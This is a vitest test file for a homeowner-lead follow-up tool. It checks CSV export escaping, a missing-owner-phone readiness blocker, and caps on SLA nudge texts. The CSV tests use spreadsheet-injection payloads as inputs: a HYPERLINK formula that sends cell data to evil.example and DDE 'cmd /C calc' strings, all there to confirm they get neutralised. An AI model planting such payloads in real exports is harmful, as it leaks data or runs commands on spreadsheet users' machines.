import { describe, expect, it } from "vitest";
import { neutralizeFormula, parseTable, toCSV } from "../src/ingest/csv.ts";
import { readiness } from "../src/breakage/readiness.ts";
import { chase, NUDGE_MAX_AGE_HOURS } from "../src/runtime/agents.ts";
import { emptyState } from "../src/runtime/state.ts";
import type { Reply } from "../src/model.ts";
import { customer, dataset } from "./fixtures.ts";

describe("CSV exports never run a homeowner's text as a formula (n7)", () => {
  it("prefixes =, +, -, @, tab and CR text with a quote, and leaves numbers, dates and phones alone", () => {
    expect(neutralizeFormula('=HYPERLINK("http://evil.example/?d="&B2,"Click")')).toBe(`'=HYPERLINK("http://evil.example/?d="&B2,"Click")`);
    expect(neutralizeFormula("@SUM(A1:A9)")).toBe("'@SUM(A1:A9)");
    expect(neutralizeFormula("+cmd|' /C calc'!A0")).toBe("'+cmd|' /C calc'!A0");
    expect(neutralizeFormula("-2+3+cmd|' /C calc'!A0")).toBe("'-2+3+cmd|' /C calc'!A0");
    expect(neutralizeFormula("\t=1+1")).toBe("'\t=1+1");
    expect(neutralizeFormula("\r=1+1")).toBe("'\r=1+1");
    for (const safe of ["-120.50", "+1 603 555 0199", "Mike Sanderson", "2026-10-01", "(603) 555-0199"]) expect(neutralizeFormula(safe)).toBe(safe);
  });
  it("toCSV writes the neutralized text and still round-trips", () => {
    const csv = toCSV(["Customer", "They wrote", "Amount"], [["=1+2", '=HYPERLINK("x","y")', -50], ["Kim Tran", "Yes please", 2400]]);
    const t = parseTable(csv);
    expect(t.rows[0]).toEqual(["'=1+2", `'=HYPERLINK("x","y")`, "-50"]);
    expect(t.rows[1]).toEqual(["Kim Tran", "Yes please", "2400"]);
  });
});

describe("readiness flags a missing owner cell (n46)", () => {
  it("is a blocker: hot leads are texted", () => {
    const r = readiness(dataset({ business: { ownerPhone: undefined, ownerEmail: "dave@ridgeline.com" }, customers: [customer("a")] }));
    const g = r.gaps.find((x) => x.id === "no_owner_cell")!;
    expect(g.level).toBe("blocker");
    expect(g.unlocks).toContain("only go to their email");
    expect(r.ready).toBe(false);
    expect(readiness(dataset({ customers: [customer("a")] })).gaps.some((x) => x.id === "no_owner_cell")).toBe(false);
  });
});

describe("SLA nudges are counted on the reply (n17, n53)", () => {
  const lead = (id: string, handedOffAt: string): Reply => ({ id, customerId: "a", channel: "email", receivedAt: handedOffAt, handedOffAt, from: "a@gmail.com", text: "yes please", intent: "wants_it", confidence: 0.9, extracted: {}, status: "handed_off" });
  const fresh = () => {
    const s = emptyState(dataset({ customers: [customer("a")] }), "2026-09-29T08:00:00");
    s.replies.push(lead("r1", "2026-09-29T08:00:00"));
    return s;
  };
  it("nudges twice, and never again even when the old nudge texts are no longer loaded", () => {
    const s = fresh();
    expect(chase(s, "2026-09-29T12:30:00", 4)).toHaveLength(1);
    expect(chase(s, "2026-09-30T08:30:00", 4)).toHaveLength(1);
    expect(s.replies[0]!.nudges).toBe(2);
    expect(s.replies[0]!.lastNudgeAt).toBe("2026-09-30T08:30:00");
    // a restart that loaded none of the old owner messages
    s.ownerMessages = [];
    expect(chase(s, "2026-10-01T08:30:00", 4)).toHaveLength(0);
    expect(chase(s, "2026-10-02T08:30:00", 4)).toHaveLength(0);
  });
  it("never texts about a lead handed off more than a week ago", () => {
    const s = fresh();
    const late = new Date(Date.parse("2026-09-29T08:00:00Z") + (NUDGE_MAX_AGE_HOURS + 1) * 3600000).toISOString().slice(0, 19);
    expect(chase(s, late, 4)).toHaveLength(0);
    expect(s.replies[0]!.nudges).toBeUndefined();
  });
});
